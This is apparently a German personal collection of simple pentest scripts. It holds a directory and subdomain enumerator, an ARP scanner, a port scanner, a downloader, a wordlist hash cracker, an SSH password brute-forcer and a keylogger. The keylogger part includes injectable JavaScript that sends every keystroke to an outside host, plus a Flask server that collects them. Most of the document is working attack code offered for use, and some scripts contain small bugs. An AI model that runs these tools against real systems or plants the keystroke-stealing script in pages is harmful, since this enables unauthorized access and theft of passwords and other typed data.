# Einfache Pentest-Skripte

## Directory Enumeration

```python
import requests
import sys

if len(sys.argv) < 2:
  print(f'python skript.py <host> <wordlist>')
  exit()

HOST=sys.argv[1]
WORDL=sys.argv[2]
DIRS=open(WORDL).read().splitlines()
dmax=len(DIRS)
dact=0

ret={}
for d in DIRS:
  dact+=1
  print(f'\rTesting {dact}/{dmax} :: [+]{len(ret.keys())}', end='', flush=True)
  dir_e = f'http://{HOST}/{d}.html'
  r = requests.get(dir_e)
  if r.status_code!=404:
    ret.update({dir_e:str(r.status_code)})

for k,v in ret.items():
  print(f'{v} - {k}')
```



## Subdomain Enumeration

```python
import requests
import sys

if len(sys.argv) < 2:
  print("python skript.py <host> <wordlist>")
  exit()
HOST=sys.argv[1]
WORDS=sys.argv[2]

sub_list = open(WORDS).read()
subdoms = sub_list.splitlines()

valid = []
for sub in subdoms:
  sub_domains = f"http://{sub}.{HOST}"
  print(f"trying {sub_domains}")
  try:
    requests.get(sub_domains)

  except requests.ConnectionError:
    pass
  else:
    print(f"  Valid domain: {sub_domains}")
    valid.append(sub_domains)
if len(valid) == 1:
  print(valid[0])
else:
  for e in sub_domains:
    print(f' + {e}')
```



## Netzwerkscanner

```python
from scapy.all import *

interface = "enp0s3" #"eth0"
ip_range = "10.10.190.3/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range) 

ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)

for send,receive in ans:
        print(receive.sprintf(r"%Ether.src% - %ARP.psrc%"))
```



## Portscanner

```python
import sys
import socket
import pyfiglet

ascii_banner = pyfiglet.figlet_format("Port Scanner\nshift000")
print(ascii_banner)

ip = input("Target-IP: ")
open_ports =[] 

ports = [1,2,3,4,22,34,80,1999,2100,3222] #range(1, 65535)

def probe_port(ip, port, result = 1): 
  try: 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.settimeout(0.5) 
    r = sock.connect_ex((ip, port))   
    if r == 0: 
      result = r 
    sock.close() 
  except Exception as e: 
    pass 
  return result

for port in ports: 
  print(f"\rTesting {port}", end='', flush=True)
  sys.stdout.flush() 
  response = probe_port(ip, port) 
  if response == 0: 
    open_ports.append(port) 
    
if open_ports: 
  print ("Open Ports are: ") 
  print (sorted(open_ports)) 
else: 
  print ("Looks like no ports are open :(")
```



## Downloader für Dateien

```python
import requests
import sys
if len(sys.argv) < 2:
  print("python downloader.py <url_path> <filename>")
  exit()
url_path=sys.argv[1]
file=sys.argv[2]

url = f'https://{url_path}/{file}'
r = requests.get(url, allow_redirects=True)
open(f'{file}', 'wb').write(r.content) 
```



## Hash Cracker

```python
import hashlib
import pyfiglet

ascii_banner = pyfiglet.figlet_format("shift000 \n MD5/SHA256 Hashcracker")
print(ascii_banner)

wordlist_location = str(input('Enter wordlist file location: '))
hash_input = str(input('Enter hash to be cracked: '))

h_type = int(input('MD5[1] oder SHA256[2]: '))
if h_type == 1:
  h_func = hashlib.md5
else:
  h_func = hashlib.sha256

with open(wordlist_location, 'r') as file:
    for line in file.readlines():
        hash_ob = h_func(line.strip().encode())
        hashed_pass = hash_ob.hexdigest()
        if hashed_pass == hash_input:
            print('Found cleartext password! ' + line.strip())
            exit(0)
```



## Keylogger

Hier wird root-priv benötigt

{% code title="python" %}
```python
import keyboard
keys = keyboard.record(until ='ENTER')
keyboard.play(keys)
```
{% endcode %}

***

{% code title=".js Frontend" %}
```javascript
// reines Übertragen aller Tastenanschläge
document.onkeypress = function(e) {
  fetch(
    'http://10.14.84.33:8855?key=' + btoa(e.key)
  );
}

// oder komprimiert + initiale Nachricht beim Laden der Seite
onload=()=>fetch('http://10.14.84.33:8855?key='+btoa('ssSTAXss')),onkeypress=e=>fetch('http://10.14.84.33:8855?key='+btoa(e.key));
```
{% endcode %}

{% code title="python Backend" %}
```python
from flask import Flask, request
import base64
import logging

app = Flask(__name__)

# Logging aktivieren
logging.basicConfig(level=logging.INFO)

DATASTREAM = ''

@app.route("/", methods=["GET"])
def keylogger():
    global DATASTREAM
    key_param = request.args.get("key")
    if key_param:
        try:
            decoded_key = base64.b64decode(key_param).decode("utf-8")
            app.logger.info(f"Tasteneingabe empfangen: {decoded_key}")
            if decoded_key in ("ENTER", "ACCF"):
                DATASTREAM += '\n'
            else:
                DATASTREAM += decoded_key
            return "Empfangen", 200
        except Exception as e:
            app.logger.error(f"Fehler beim Dekodieren: {e}")
            return "Fehlerhafte Anfrage", 400
    return "Kein Schlüssel übergeben", 400

@app.route("/curr", methods=["GET"])
def get_curr():
    global DATASTREAM
    return DATASTREAM, 666

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8855)
```
{% endcode %}





## SSH Bruteforce

```python
import paramiko
import sys
import os

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('password found: '+ password)
                 exit(0)
            elif response == 1: 
                print('no luck')
        except Exception as e:
            print(e)
        pass

input_file.close()

```

